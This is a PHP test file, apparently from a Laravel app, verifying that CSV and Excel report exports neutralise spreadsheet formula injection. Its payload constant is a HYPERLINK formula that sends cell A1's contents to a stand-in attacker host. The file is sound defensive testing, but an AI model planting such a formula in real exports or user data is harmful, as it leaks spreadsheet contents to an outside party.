<?php

namespace Tests\Feature\Seguridad;

use App\Helpers\ExportSeguroHelper;
use App\Services\ReportesExportService;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * M11-01: los valores que empiezan por = + - @ no se exportan como fórmulas.
 */
class ExportSinFormulasTest extends TestCase
{
    private const PAYLOAD = '=HYPERLINK("http://atacante.example/?x="&A1,"Ver")';

    public function test_csv_antepone_comilla_a_valores_peligrosos(): void
    {
        $this->assertSame("'".self::PAYLOAD, ExportSeguroHelper::celdaCsv(self::PAYLOAD));
        $this->assertSame("'+57 300", ExportSeguroHelper::celdaCsv('+57 300'));
        $this->assertSame("'@SUM(A1)", ExportSeguroHelper::celdaCsv('@SUM(A1)'));
        $this->assertSame('Serie Contratos', ExportSeguroHelper::celdaCsv('Serie Contratos'));
        $this->assertSame(-5, ExportSeguroHelper::celdaCsv(-5));
        $this->assertNull(ExportSeguroHelper::celdaCsv(null));
    }

    public function test_excel_guarda_el_texto_como_texto(): void
    {
        $path = app(ReportesExportService::class)->exportarExcel(
            ['datos' => [['nombre' => self::PAYLOAD, 'total' => 3]]],
            'test-m11-01',
            ['nombre', 'total']
        );

        try {
            $sheet = IOFactory::load($path)->getActiveSheet();

            $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A2')->getDataType());
            $this->assertSame(self::PAYLOAD, $sheet->getCell('A2')->getValue());
            $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('B2')->getDataType());
        } finally {
            @unlink($path);
        }
    }

    public function test_csv_de_reportes_sale_saneado(): void
    {
        $respuesta = app(ReportesExportService::class)->exportarCSV(
            ['datos' => [['nombre' => self::PAYLOAD]]],
            'test-m11-01',
            ['nombre']
        );

        ob_start();
        $respuesta->sendContent();
        $csv = ob_get_clean();

        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringNotContainsString(',=HYPERLINK', $csv);
        $this->assertDoesNotMatchRegularExpression('/^"?=HYPERLINK/m', $csv);
    }
}
